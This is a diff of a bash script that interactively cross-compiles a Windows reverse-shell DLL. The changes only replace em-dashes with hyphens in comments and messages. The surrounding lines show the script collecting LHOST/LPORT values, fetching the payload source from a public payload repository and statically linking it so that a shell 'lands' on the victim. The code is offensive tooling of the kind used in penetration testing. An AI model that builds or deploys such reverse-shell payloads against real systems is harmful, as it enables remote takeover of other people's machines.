@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ---------------------------------------------------------------------------
-# build_revshell_dll.sh — interactive cross-compiler for revshell_pure_dll.dll
+# build_revshell_dll.sh - interactive cross-compiler for revshell_pure_dll.dll
 #
 # Prompts for LHOST / LPORT (remembers your last answers in a .conf next to
 # this script), shows a numbered arch menu (x64 / x86 / ARM64 / all), and
@@ -23,7 +23,7 @@ CONF="$HERE/build_revshell_dll.conf"
 SRC=""
 OUT_DIR=""
 
-# Upstream URL for the .cpp — used when the script runs outside the repo and
+# Upstream URL for the .cpp - used when the script runs outside the repo and
 # no local copy of the source is found.
 SRC_URL="https://raw.githubusercontent.com/m14r41/PayloadEverything/main/thick-client/process-injection-2/reverse-shell/revshell_pure_dll.cpp"
 
@@ -31,7 +31,7 @@ SRC_URL="https://raw.githubusercontent.com/m14r41/PayloadEverything/main/thick-c
 DEF_LHOST="10.10.14.1"
 DEF_LPORT="4444"
 
-# load previous answers if the conf exists — BUT reject nonsense values
+# load previous answers if the conf exists - BUT reject nonsense values
 # (if LHOST got saved as "1" or anything not dotted-quad we silently drop it,
 # so a bad conf doesn't quietly produce a broken DLL on the next run).
 LHOST=""; LPORT=""
@@ -81,7 +81,7 @@ apt_install() {
     sudo apt-get install -y "$pkg"
 }
 
-# curl OR wget — for source/llvm-mingw downloads
+# curl OR wget - for source/llvm-mingw downloads
 ensure_downloader() {
     if command -v curl >/dev/null 2>&1; then return 0; fi
     if command -v wget >/dev/null 2>&1; then return 0; fi
@@ -89,7 +89,7 @@ ensure_downloader() {
     apt_install curl
 }
 
-# tar + xz — for the llvm-mingw archive
+# tar + xz - for the llvm-mingw archive
 ensure_archive_tools() {
     command -v tar >/dev/null 2>&1 || apt_install tar
     command -v xz  >/dev/null 2>&1 || apt_install xz-utils
@@ -127,7 +127,7 @@ ensure_llvm_mingw() {
     ensure_downloader
     ensure_archive_tools
 
-    echo -e "${Y}[*]${N} llvm-mingw needed for ARM64 — downloading (~90 MB, one-time)"
+    echo -e "${Y}[*]${N} llvm-mingw needed for ARM64 - downloading (~90 MB, one-time)"
     echo -e "       ${C}$LLVM_MINGW_URL${N}"
 
     mkdir -p "$LLVM_MINGW_DIR"
@@ -191,7 +191,7 @@ locate_source() {
         echo -e "${G}[+]${N} source : ${C}$SRC${N}  (standalone)"
         return 0
     fi
-    # 3) not present anywhere — download it next to the script
+    # 3) not present anywhere - download it next to the script
     echo -e "${Y}[*]${N} source .cpp not found locally"
     echo -e "${Y}[*]${N} downloading from ${C}$SRC_URL${N} ..."
     local dest="$HERE/revshell_pure_dll.cpp"
@@ -215,7 +215,7 @@ locate_source() {
 banner() {
     echo
     echo -e "${G}${B}================================================================${N}"
-    echo -e "${G}${B}  revshell_pure_dll.dll  —  interactive cross-compiler${N}"
+    echo -e "${G}${B}  revshell_pure_dll.dll  -  interactive cross-compiler${N}"
     echo -e "${G}${B}================================================================${N}"
     echo
 }
@@ -298,7 +298,7 @@ build_one() {
     # -static / -static-libgcc / -static-libstdc++  : link MinGW runtime in,
     #   so the DLL does not need libgcc_s_seh-1.dll or libstdc++-6.dll on
     #   the victim (without this the DLL loads but background threads die
-    #   silently — classic "DLL loads but no shell lands" symptom).
+    #   silently - classic "DLL loads but no shell lands" symptom).
     # -fno-exceptions / -fno-rtti : trim ~20 KB of unused C++ metadata.
     if "$cxx" -shared -O2 -s \
               -static -static-libgcc -static-libstdc++ \
@@ -315,7 +315,7 @@ build_one() {
 
 save_conf() {
     cat > "$CONF" <<EOF
-# written by build_revshell_dll.sh — edit or delete freely
+# written by build_revshell_dll.sh - edit or delete freely
 LHOST="$LHOST"
 LPORT="$LPORT"
 EOF
@@ -341,8 +341,8 @@ main() {
 
     echo
     echo "Pick architecture:"
-    echo -e "  ${C}1${N})  x64    (AMD64 — 99% of modern Windows targets)"
-    echo -e "  ${C}2${N})  x86    (32-bit / WOW64 — legacy apps)"
+    echo -e "  ${C}1${N})  x64    (AMD64 - 99% of modern Windows targets)"
+    echo -e "  ${C}2${N})  x86    (32-bit / WOW64 - legacy apps)"
     echo -e "  ${C}3${N})  ARM64  (Surface Pro X, newer ARM laptops)"
     echo -e "  ${C}4${N})  all three"
     choice="$(prompt "choice" "1")"
